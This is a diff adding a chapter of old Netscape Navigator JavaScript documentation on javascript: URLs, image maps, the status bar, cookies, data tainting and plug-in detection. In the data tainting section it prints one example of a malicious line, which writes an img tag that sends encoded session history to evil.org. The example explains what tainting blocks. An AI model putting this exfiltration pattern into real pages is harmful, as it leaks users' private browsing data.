@@ -1,0 +1,678 @@
+<BODY BGCOLOR="#FFFFFF">
+<A NAME="1001595">
+<P>
+</A><A NAME="1001596">
+<P>
+</A><A NAME="996824">
+<H1>Advanced topics
+</H1>
+</A>
+
+<A NAME="997436">
+
+<img src="graphics/advtopia.gif">
+
+his chapter describes some special concepts and applications that extend the power and flexibility of Navigator JavaScript. The chapter covers the following topics:
+
+<P><TABLE BORDER="2">
+<CAPTION></CAPTION>
+<tr align=left valign=top>
+<td><A NAME="1011666">
+<LI><a href="advtopic.htm#1004952">Using JavaScript URLs</a></A>
+<td><A NAME="1011620">
+<LI><a href="advtopic.htm#1013101">Using cookies</a>
+</A>
+
+<tr align=left valign=top>
+<td><A NAME="1011696">
+<LI><a href="advtopic.htm#1006105">Using client-side image maps</a>
+</A>
+<td><A NAME="1011698">
+<LI><a href="advtopic.htm#1009533">Using data tainting for security</a>
+</A>
+
+
+<tr align=left valign=top>
+<td><A NAME="1011700">
+<LI><a href="advtopic.htm#1006224">Using server-side image maps</a>
+</A>
+<td><A NAME="1011702">
+<LI><a href="advtopic.htm#1012507">Determining installed plug-ins</a>
+</A>
+
+
+<tr align=left valign=top>
+<td><A NAME="1011625">
+<LI><a href="advtopic.htm#1006028">Using the status bar</a>
+</A>
+<td><A NAME="1011627">
+<P></A>
+
+
+
+
+</TABLE>
+
+<TABLE>
+<TR><TD>
+</TABLE>
+
+
+<P></A>
+
+
+<!------------------------------>
+<HR>
+<A NAME="Using JavaScript URLs"></A>
+<A NAME="1004952">
+<H1> Using JavaScript URLs</H1>
+</A>
+<A NAME="1006101">
+You should be familiar with the standard types of URLS: http, ftp, file, and so on. With Navigator you can also use URLs of type "javascript:" to execute JavaScript statements instead of loading a document. You simply use a string beginning with "javascript:" as the value for the HREF attribute of anchor tags. For example, you can define a hyperlink as follows:<P></A>
+<A NAME="1006111">
+<PRE>&lt;A HREF="javascript:history.go(0)"&gt;Reload Now&lt;/A&gt;</PRE>
+</A>
+<A NAME="1006112">
+to reload the current page when the user clicks it. In general, you can put any statements or function calls after the "javascript:" URL prefix.<P></A>
+<A NAME="1006113">
+You can use JavaScript URLs in many ways to add functionality to your applications. For example, you could increment a counter <I>p1</I> in a parent frame whenever a user clicks a link, using the following function:<P></A>
+<A NAME="1006127">
+<PRE>function countJumps() {<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;parent.p1++<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;window.location=page1<br>}</PRE>
+</A>
+<A NAME="1007950">
+To call the function, use a JavaScript URL in a standard HTML hyperlink:<P></A>
+<A NAME="1007937">
+<PRE>&lt;A HREF="javascript:countJumps()"&gt;Page 1&lt;/A&gt;</PRE>
+</A>
+<A NAME="1006109">
+This example assumes <I>page1</I> is a string representing a URL.<P></A>
+<A NAME="1013346">
+If the value of the expression following a "javascript:" URL prefix evaluates to undefined, no new document is loaded. If the expression evaluates to a defined type, the value is converted to a string that specifies the source of the document to load.<P></A>
+
+
+<!------------------------------>
+<HR>
+<A NAME="Using client-side image maps"></A>
+<A NAME="1006105">
+<H1> Using client-side image maps</H1>
+</A>
+<A NAME="1006034">
+A client-side image map is defined with the MAP tag. You can define areas within the image that are hyperlinks to distinct URLs; the areas can be rectangles, circles, or polygons. <P></A>
+<A NAME="1006168">
+Instead of standard URLs, you can also use JavaScript URLs in client-side image maps, for example,<P></A>
+<A NAME="1006059">
+<PRE>&lt;MAP NAME="buttonbar"&gt;<br>&lt;AREA SHAPE="RECT" COORDS="0,0,16,14" <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;HREF ="javascript:top.close(); window.location = newnav.html"&gt;<br>&lt;AREA SHAPE="RECT" COORDS="0,0,85,46" <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;HREF="contents.html" target="javascript:alert(`Loading <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Contents.'); top.location = contents.html"&gt;<br>&lt;/MAP&gt;</PRE>
+</A>
+
+
+<!------------------------------>
+<HR>
+<A NAME="Using server-side image maps"></A>
+<A NAME="1006224">
+<H1> Using server-side image maps</H1>
+</A>
+<A NAME="1013514">
+Client-side image maps provide functionality to perform most tasks, but standard (sometimes called server-side) image maps provide even more flexibility. You specify a standard image map with the ISMAP attribute of an IMG tag that is a hyperlink. For example,<P></A>
+
+<a name="1013517">
+<blockquote>The "about:logo" 
+image is built in to 
+Navigator and 
+displays the Netscape 
+logo. 
+</blockquote>
+</a>
+<A NAME="1006271">
+<PRE>&lt;A HREF="img.html"&gt;&lt;IMG SRC="about:logo" BORDER=0 ISMAP&gt;&lt;/A&gt;</PRE>
+</A>
+<A NAME="1006246">
+When you click an image with the ISMAP attribute, Navigator requests a URL of the form<P></A>
+<A NAME="1006228">
+<PRE><I>URL</I>?<I>x</I>,<I>y</I></PRE>
+</A>
+<A NAME="1006229">
+where <I>URL</I> is the document specified by the value of the HREF attribute, and <I>x</I> and <I>y</I> are the horizontal and vertical coordinates of the mouse pointer (in pixels from the top-left of the image) when you clicked. <P></A>
+<A NAME="1008389">
+Traditionally, image-map requests are sent to servers, and a CGI program performs a database lookup function. With Navigator JavaScript, however, you can perform the lookup on the client. You can use the <I>search</I> property of the <I>location</I> object to parse the <I>x</I> and <I>y</I> coordinates and perform an action accordingly. For example, suppose you have a file named <code>img.html </code>with the following content:<P></A>
+<A NAME="1006279">
+<PRE>&lt;H1&gt;Click on the image&lt;/H1&gt;<br>&lt;P&gt;<br>&lt;A HREF="img.html"&gt;&lt;IMG SRC="about:logo" BORDER=0 ISMAP&gt;&lt;/A&gt;<br>&lt;SCRIPT&gt;<br>str = location.search<br>if (str == "") <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;document.write("&lt;P&gt;No coordinates specified.")<br>else {<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;commaloc = str.indexOf(",") // the location of the comma<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;document.write("&lt;P&gt;The x value is " + str.substring(1, commaloc))<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;document.write("&lt;P&gt;The y value is " + str.substring(commaloc+1, str.length))<br>}<br>&lt;/SCRIPT&gt;</PRE>
+</A>
+<A NAME="1006748">
+When you click a part of the image, Navigator reloads the page (because the HREF attribute specifies the same document), adding the <I>x</I> and <I>y</I> coordinates of the mouse-click to the URL. The statements in the <B>else</B> clause then display the <I>x</I> and <I>y</I> coordinates. In practice, you could redirect to another page (by setting location) or perform some other action based on the values of <I>x</I> and <I>y</I>.<P></A>
+
+
+<!------------------------------>
+<HR>
+<A NAME="Using the status bar"></A>
+<A NAME="1006028">
+<H1> Using the status bar</H1>
+</A>
+<A NAME="1006029">
+You can use two <I>window</I> properties, <I>status</I> and <I>defaultStatus</I>, to display messages in the Navigator status bar at the bottom of the window. Navigator normally uses the status bar to display such messages as "Contacting Host..." and "Document: Done." The <I>defaultStatus</I> message appears when nothing else is in the status bar. The <I>status</I> property displays a transient message in the status bar, such as when the user moves the mouse pointer over a link. <P></A>
+<A NAME="1006353">
+You can set these properties to display custom messages. For example, to display a custom message after the document has finished loading, simply set <I>defaultStatus</I>. For example,<P></A>
+<A NAME="1006402">
+<PRE>defaultStatus = "Some rise, some fall, some climb...to get to Terrapin"</PRE>
+</A>
+
+<A NAME="Creating hints with onMouseOver and onMouseOut"></A>
+<A NAME="1006409">
+<H2> Creating hints with onMouseOver and onMouseOut</H2>
+</A>
+
+<A NAME="1006423">
+By default, when you move the mouse pointer over a hyperlink, the status bar displays the destination URL of the link. You can set <I>status</I> in the onMouseOut and onMouseOver event handlers of a hyperlink or image area to display hints in the status bar instead. The event handler must return true to set <I>status</I>. For example, <P></A>
+<A NAME="1006412">
+<PRE>&lt;A HREF="contents.html"<br>&nbsp;&nbsp;&nbsp;onMouseOver="window.status='Click to display contents';return true"&gt;<br>Contents&lt;/A&gt;</PRE>
+</A>
+<A NAME="1006411">
+This example displays the hint "Click to display contents" in the status bar when you move the mouse pointer over the link.<P></A>
+
+
+<!------------------------------>
+<HR>
+<A NAME="Using cookies"></A>
+<A NAME="1013101">
+<H1> Using cookies</H1>
+</A>
+
+<a name="1013102">
+<blockquote>For a complete 
+description of 
+cookies, see 
+<a href="cookies.htm#1002170">Appendix&nbsp;D, 
+"Netscape cookies."</a>.
+</blockquote>
+</a>
+<A NAME="1013107">
+Netscape <I>cookies</I> are a mechanism for storing persistent data on the client in a file called <code>cookies.txt</code>. Because HyperText Transport Protocol (HTTP) is a stateless protocol, cookies provide a way to maintain information between client requests. This section discusses basic uses of cookies and illustrates with a simple example. <P></A>
+<A NAME="1013108">
+Each cookie is a small item of information with an optional expiration date and is added to the cookie file in the following format:<P></A>
+<A NAME="1013109">
+<PRE><I>name</I>=<I>value</I>;expires=<I>expDate;</I></PRE>
+</A>
+
+<a name="1013110">
+<blockquote>For more 
+information on 
+escape and 
+unescape, see the 
+topics in the 
+reference section.
+</blockquote>
+</a>
+<A NAME="1013111">
+<I>name</I> is the name of the datum being stored, and <I>value</I> is its value. If <I>name</I> and <I>value</I> contain any semicolon, comma, or blank (space) characters, you must use the <B>escape</B> function to encode them and the <B>unescape</B> function to decode them.<P></A>
+<A NAME="1013117">
+<I>expDate</I> is the expiration date, in GMT date format:<P></A>
+<A NAME="1013118">
+<PRE>Wdy, DD-Mon-YY HH:MM:SS GMT</PRE>
+</A>
+<A NAME="1013119">
+Although it's slightly different from this format, the date string returned by the <I>Date</I> method <B>toGMTString</B> can be used to set cookie expiration dates.<P></A>
+<A NAME="1013122">
+The expiration date is an optional parameter indicating how long to maintain the cookie. If <I>expDate</I> is not specified, the cookie expires when the user exits the current Navigator session. Navigator maintains and retrieves a cookie only if its expiration date has not yet passed. <P></A>
+
+<A NAME="Limitations"></A>
+<A NAME="1013124">
+<H2> Limitations</H2>
+</A>
+
+<A NAME="1013125">
+Cookies have these limitations<P></A>
+<ul><A NAME="1013126">
+<LI>Three hundred total cookies in the cookie file.
+</A><A NAME="1013127">
+<LI>4 Kbytes per cookie, for the sum of both the cookie's name and value. 
+</A><A NAME="1013128">
+<LI>Twenty cookies per server or domain (completely specified hosts and domains are treated as separate entities and have a twenty-cookie limitation for each, not combined).
+</A></ul><A NAME="1013129">
+Cookies can be associated with one or more directories. If your files are all in one directory, then you need not worry about this. If your files are in multiple directories, you may need to use an additional path parameter for each cookie. For more information, see <a href="cookies.htm#1002170">Appendix&nbsp;D, "Netscape cookies."</a><P></A>
+
+<A NAME="Using cookies with JavaScript"></A>
+<A NAME="1013134">
+<H2> Using cookies with JavaScript</H2>
+</A>
+
+<A NAME="1013135">
+The <I>document.cookie</I> property is a string that contains all the names and values of Navigator cookies. You can use this property to work with cookies in JavaScript.<P></A>
+<A NAME="1013136">
+Here are some basic things you can do with cookies:<P></A>
+<ul><A NAME="1013137">
+<LI>Set a cookie value, optionally specifying an expiration date.
+</A><A NAME="1013138">
+<LI>Get a cookie value, given the cookie name.
+</A></ul><A NAME="1013139">
+It is convenient to define functions to perform these tasks. Here, for example, is a function that sets cookie values and expiration:<P></A>
+<A NAME="1013140">
+<PRE>// Sets cookie values. Expiration date is optional<br>//<br>function setCookie(name, value, expire) {<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;document.cookie = name + "=" + escape(value)<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;+ ((expire == null) ? "" : ("; expires=" + expire.toGMTString()))<br>}</PRE>
+</A>
+<A NAME="1013142">
+Notice the use of <B>escape</B> to encode special characters (semicolons, commas, spaces) in the value string. This function assumes that cookie names do not have any special characters.<P></A>
+<A NAME="1013143">
+The following function returns a cookie value, given the name of the cookie:<P></A>
+<A NAME="1013144">
+<PRE>function getCookie(Name) {<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;var search = Name + "="<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if (document.cookie.length &gt; 0) { // if there are any cookies<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;offset = document.cookie.indexOf(search) <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if (offset != -1) { // if cookie exists <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;offset += search.length <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;// set index of beginning of value<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;end = document.cookie.indexOf(";", offset) <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;// set index of end of cookie value<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if (end == -1) <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;end = document.cookie.length<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return unescape(document.cookie.substring(offset, end))<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;} <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<br>}</PRE>
+</A>
+<A NAME="1013146">
+Notice the use of <B>unescape</B> to decode special characters in the cookie value.<P></A>
+
+<A NAME="Using cookies: an example"></A>
+<A NAME="1013148">
+<H2> Using cookies: an example</H2>
+</A>
+
+<A NAME="1013149">
+Using the cookie functions defined in the previous section, you can create a simple page users can fill in to "register" when they visit your page. If they return to your page within a year, they will see a personal greeting. <P></A>
+<A NAME="1013150">
+You need to define one additional function in the HEAD of the document. This function, <B>register</B>, creates a cookie with the name <I>TheCoolJavaScriptPage</I> and the value passed to it as an argument.<P></A>
+<A NAME="1013151">
+<PRE>function register(name) { <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;var today = new Date()<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;var expires = new Date()<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;expires.setTime(today.getTime() + 60*60*24*365)<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;setCookie("TheCoolJavaScriptPage", name, expires)<br>}</PRE>
+</A>
+<A NAME="1013152">
+The BODY of the document uses <B>getCookie</B> (defined in the previous section) to check whether the cookie for <I>TheCoolJavaScriptPage</I> exists and displays a greeting if it does. Then there is a form that calls <B>register</B> to add a cookie. The onClick event handler also calls <code>history.go(0)</code> to redraw the page.<P></A>
+<A NAME="1013154">
+<PRE>&lt;BODY&gt;<br>&lt;H1&gt;Register Your Name with the Cookie-Meister&lt;/H1&gt;<br>&lt;P&gt;<br>&lt;SCRIPT&gt;<br>var yourname = getCookie("TheCoolJavaScriptPage") <br>if (yourname != null)<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;document.write("&lt;P&gt;Welcome Back, ", yourname)<br>else<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;document.write("&lt;P&gt;You haven't been here in the last year...")<br>&lt;/SCRIPT&gt;</PRE>
+</A>
+<A NAME="1013155">
+<PRE>&lt;P&gt; Enter your name. When you return to this page within a year, you will be greeted with a personalized greeting. <br>&lt;BR&gt;<br>&lt;FORM onSubmit="return false"&gt;<br>Enter your name: &lt;INPUT TYPE="text" NAME="username" SIZE= 10&gt;&lt;BR&gt;<br>&lt;INPUT TYPE="button" value="Register"<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;onClick="register(this.form.username.value); history.go(0)"&gt;<br>&lt;/FORM&gt;</PRE>
+</A>
+
+
+<!------------------------------>
+<HR>
+<A NAME="Using data tainting for security"></A>
+<A NAME="1009533">
+<H1> Using data tainting for security</H1>
+</A>
+<A NAME="1009537">
+Navigator version 2.02 and later automatically prevents scripts on one server from accessing properties of documents on a different server. This restriction prevents scripts from fetching private information such as directory structures or user session history.<P></A>
+<A NAME="1008806">
+JavaScript for Navigator 3.0 has a feature called <I>data tainting</I> that retains the security restriction but provides a means of secure access to specific components on a page.<P></A>
+<ul><A NAME="1009388">
+<LI>When data tainting is enabled, JavaScript in one window can see properties of another window, no matter what server the other window's document was loaded from. However, the author of the other window <I>taints</I> (marks) property values or other data that should be secure or private, and JavaScript cannot pass these tainted values on to any server without the user's permission.
+</A><A NAME="1009418">
+<LI>When data tainting is disabled, a script cannot access any properties of a window on another server.
+</A></ul><A NAME="1009516">
+To enable tainting, the end user sets an environment variable, as described in <a href="advtopic.htm#1009490">"Enabling tainting"</a>.<P></A>
+
+<A NAME="How tainting works"></A>
+<A NAME="1009426">
+<H2> How tainting works</H2>
+</A>
+
+<A NAME="1009427">
+A page's author is in charge of tainting elements. The following properties are tainted by default:
+
+<P><TABLE BORDER="2">
+<CAPTION></CAPTION>
+<tr align=left valign=bottom><th><b><A NAME="1009547">
+Object</A><B><th><b><A NAME="1009549">
+Tainted properties</A><B>
+<tr align=left valign=top><td><A NAME="1009551">
+document
+</A><BR>
+
+<td><A NAME="1009553">
+cookie, domain, forms, lastModified, links, referrer, title, 
+URL
+</A><BR>
+
+
+
+<tr align=left valign=top><td><A NAME="1009555">
+Form
+</A><BR>
+
+<td><A NAME="1009557">
+action
+</A><BR>
+
+
+
+<tr align=left valign=top><td><A NAME="1009702">
+any form input element
+</A><BR>
+
+<td><A NAME="1009704">
+checked, defaultChecked, defaultValue, name, 
+selectedIndex, toString, value
+</A><BR>
+
+
+
+<tr align=left valign=top><td><A NAME="1009559">
+history
+</A><BR>
+
+<td><A NAME="1009561">
+current, next, previous, toString
+</A><BR>
+
+
+
+<tr align=left valign=top><td><A NAME="1009567">
+Select option
+</A><BR>
+
+<td><A NAME="1009569">
+defaultSelected, selected, text, value
+</A><BR>
+
+
+
+<tr align=left valign=top><td><A NAME="1009571">
+location and Link
+</A><BR>
+
+<td><A NAME="1009573">
+hash, host, hostname, href, pathname, port, protocol, 
+search, toString
+</A><BR>
+
+
+
+<tr align=left valign=top><td><A NAME="1009575">
+window
+</A><BR>
+
+<td><A NAME="1009577">
+defaultStatus, status
+</A><BR>
+
+
+
+
+</TABLE>
+
+<TABLE>
+<TR><TD>
+</TABLE>
+
+
+<P></A>
+<A NAME="1009716">
+You can use tainted data elements any way you want in your script, but if your script attempts to pass a tainted element's value <I>or any data derived from it</I> over the network in any way (for example, via a form submission or URL), a dialog box is displayed so the user can confirm or cancel the operation.<P></A>
+<A NAME="1009768">
+Values derived from tainted data elements are also tainted. If a tainted value is passed to a function, the return value of the function is tainted. If a string is tainted, any substring of the string is also tainted. If a script examines a tainted value in an <B>if</B>, <B>for</B>, or <B>while</B> statement, the script itself accumulates taint.<P></A>
+<A NAME="1009732">
+You can taint and untaint properties, variables, functions, and objects, as described in <a href="advtopic.htm#1010824">"Tainting and untainting individual data elements"</a>. You cannot untaint another server's properties or data elements.<P></A>
+
+<A NAME="Enabling tainting"></A>
+<A NAME="1009490">
+<H2> Enabling tainting</H2>
+</A>
+
+<A NAME="1009491">
+To enable data tainting, the end user sets the <B>NS_ENABLE_TAINT</B> environment variable as follows:<P></A>
+<ul><A NAME="1009492">
+<LI>On Unix, use the <B>setenv</B> command in csh.
+</A><A NAME="1009493">
+<LI>On Windows, use <B>set</B> in <code>autoexec.bat</code> or NT user settings.
+</A><A NAME="1009494">
+<LI>On Macintosh, edit the resource with type "Envi" and number 128 in the Netscape application by removing the two ascii slashes "//" before the <B>NS_ENABLE_TAINT</B> text at the end of the resource.
+</A></ul><A NAME="1009495">
+<B>NS_ENABLE_TAINT</B> can have any value; "1" will do.<P></A>
+<A NAME="1009779">
+If the end user does not enable tainting and a script attempts to access properties of a window on another server, a message is displayed indicating that access is not allowed.<P></A>
+<A NAME="1010433">
+To determine whether tainting is enabled, use the <B>taintEnabled</B> method. The following code executes <I>function1</I> if data tainting is enabled; otherwise it executes <I>function2</I>.<P></A>
+<A NAME="1010440">
+<PRE>if (navigator.taintEnabled()) {<br>&nbsp;&nbsp;&nbsp;function1()<br>}<br>else function2()</PRE>
+</A>
+<A NAME="1010457">
+For details on <B>taintEnabled</B>, see <a href="ref_t-z.htm#99739">"taintEnabled"</a>.<P></A>
+
+<A NAME="Tainting and untainting individual data elements"></A>
+<A NAME="1010824">
+<H2> Tainting and untainting individual data elements</H2>
+</A>
+
+<A NAME="1010832">
+You can taint data elements (properties, variables, functions, objects) in your scripts to prevent the returned values from being used inappropriately by other scripts or propagating beyond another script. You might want to remove tainting from a data element so other scripts can read and do anything with it. You cannot untaint another server's data elements.<P></A>
+<A NAME="1010041">
+You control the tainting of data elements with two functions: <B>taint</B> adds tainting to a data element, and <B>untaint</B> removes tainting from a data element. These functions each take a single data element as an argument.<P></A>
+<A NAME="1008812">
+For example, the following statement removes taint from a property so that a script can send it to another server:<P></A>
+<A NAME="1008813">
+<PRE>untaintedStat=untaint(window.defaultStatus)<br>// untaintedStat can now be sent in a URL or form post by other scripts</PRE>
+</A>
+<A NAME="1008814">
+Neither <B>taint</B> nor <B>untaint</B> modifies its argument; rather, both functions return a marked or unmarked reference to the argument object, or copy of the primitive type value (number or boolean value). The mark is called a <I>taint code.</I> JavaScript assigns a unique taint code to each server's data elements. Untainted data has the <I>identity</I> (null) taint code.<P></A>
+<A NAME="1010084">
+For details on <B>taint</B> and <B>untaint</B>, see <a href="ref_t-z.htm#98587">"taint"</a> and <a href="ref_t-z.htm#135008">"untaint"</a>.<P></A>
+
+<A NAME="Tainting that results from conditional statements"></A>
+<A NAME="1008815">
+<H2> Tainting that results from conditional statements</H2>
+</A>
+
+<A NAME="1012139">
+In some cases, control flow rather than data flow carries tainted information. To handle these cases, each window has a <I>taint accumulator.</I> The taint accumulator holds taint tested in the condition portion of <B>if</B>, <B>for</B>, and <B>while</B> statements. The accumulator mixes different taint codes to create new codes that identify the combination of data origins (for example, serverA, serverB, or serverC).<P></A>
+<A NAME="1008816">
+The taint accumulator is reset to identity only if it contains the current document's original taint code. Otherwise, taint accumulates until the document is unloaded. All windows loading documents from the same origin share a taint accumulator.<P></A>
+<A NAME="1008817">
+You can add taint to or remove taint from a window's taint accumulator.<P></A>
+<ul><A NAME="1010169">
+<LI>To add taint to a window, call <B>taint</B> with no argument. JavaScript adds the current document's taint code to the accumulator.
+</A><A NAME="1010170">
+<LI>To remove taint from a window, call <B>untaint</B> with no argument. Calling <B>untaint</B> with no arguments removes taint from the accumulator only if the accumulator holds taint from the current window only; if it holds taint from operations done on data elements from other servers, <B>untaint</B> will have no effect. Removing taint from the accumulator results in the accumulator having only the identity taint code.
+</A></ul><A NAME="1012518">
+If a window's taint accumulator holds taint and the script attempts to pass data over the network, the taint codes in the accumulator are checked. Only if the accumulated script taint, the taint code of the targeted server, and the taint code of the data being sent are compatible will the operation proceed. Compatible means that either two taint codes are equal, or at least one is identity (null). If the script, server, and data taints are incompatible, a dialog box is displayed so the user can confirm or cancel the URL load or form post.<P></A>
+<A NAME="1008820">
+Accumulated taint propagates across <B>setTimeout</B> and into the evaluation of the first argument to <B>setTimeout</B>. It propagates through <I>document.write</I> into generated tags, so that a malicious script cannot signal private information such as session history by generating an HTML tag with an implicitly-loaded URL SRC parameter such as the following:<P></A>
+<A NAME="1008821">
+<PRE>document.write("&lt;img src=http://evil.org/cgi.bin/fake-img?" +<br>&nbsp;&nbsp;&nbsp;encode(history) + "&gt;")</PRE>
+</A>
+
+
+<!------------------------------>
+<HR>
+<A NAME="Determining installed plug-ins"></A>
+<A NAME="1012507">
+<H1> Determining installed plug-ins</H1>
+</A>
+<A NAME="1012511">
+You can use JavaScript to determine whether a user has installed a particular plug-in; you can then display embedded plug-in data if the plug-in is installed, or display some alternative information (for example, an image or text) if it is not. You can also determine whether a client is capable of handling a particular MIME (Multipart Internet Mail Extension) type. This section introduces the objects and properties needed for handling plug-ins and MIME types. For more detailed information on these objects and properties, see the corresponding reference topics in Part&nbsp;3, "Reference."<P></A>
+<A NAME="1008429">
+The <I>navigator </I>object has two properties for checking installed plug-ins: the <I>mimeTypes</I> array and the <I>plugins</I> array.<P></A>
+
+<A NAME="mimeTypes array"></A>
+<A NAME="1008555">
+<H2> mimeTypes array</H2>
+</A>
+
+<A NAME="1008430">
+<I>mimeTypes</I> is an array of all MIME types supported by the client (either internally, via helper applications, or by plug-ins). Each element of the array is a <I>MimeType</I> object, which has properties for its type, description, file extensions, and enabled plug-ins.<P></A>
+<A NAME="1008657">
+For example, the following table summarizes the values for displaying JPEG images:
+
+<P><TABLE BORDER="2">
+<CAPTION></CAPTION>
+<tr align=left valign=bottom><th><b><A NAME="1008635">
+Expression</A><B><th><b><A NAME="1008637">
+Value</A><B>
+<tr align=left valign=top><td><A NAME="1008639">
+<code>navigator.mimeTypes["image/jpeg"].type
+</code></A><BR>
+
+<td><A NAME="1008641">
+<code>image/jpeg
+</code></A><BR>
+
+
+
+<tr align=left valign=top><td><A NAME="1008643">
+<code>navigator.mimeTypes["image/jpeg"].description
+</code></A><BR>
+
+<td><A NAME="1008645">
+<code>JPEG Image
+</code></A><BR>
+
+
+
+<tr align=left valign=top><td><A NAME="1008647">
+<code>navigator.mimeTypes["image/jpeg"].suffixes
+</code></A><BR>
+
+<td><A NAME="1008649">
+<code>jpeg, jpg, jpe, jfif, 
+pjpeg, pjp
+</code></A><BR>
+
+
+
+<tr align=left valign=top><td><A NAME="1008651">
+<code>navigator.mimeTypes["image/jpeg"].enabledPlugin
+</code></A><BR>
+
+<td><A NAME="1008653">
+<code>null
+</code></A><BR>
+
+
+
+
+</TABLE>
+
+<TABLE>
+<TR><TD>
+</TABLE>
+
+
+<P></A>
+<A NAME="1008585">
+The following script checks to see whether the client is capable of displaying QuickTime movies.<P></A>
+<A NAME="1008701">
+<PRE>var myMimetype = navigator.mimeTypes["video/quicktime"]<br>if (myMimetype)<br>&nbsp;&nbsp;&nbsp;document.writeln("Click &lt;A HREF='movie.qt'&gt;here&lt;/A&gt; to see a " +<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;myMimetype.description)<br>else<br>&nbsp;&nbsp;&nbsp;document.writeln("Too bad, can't show you any movies.")</PRE>
+</A>
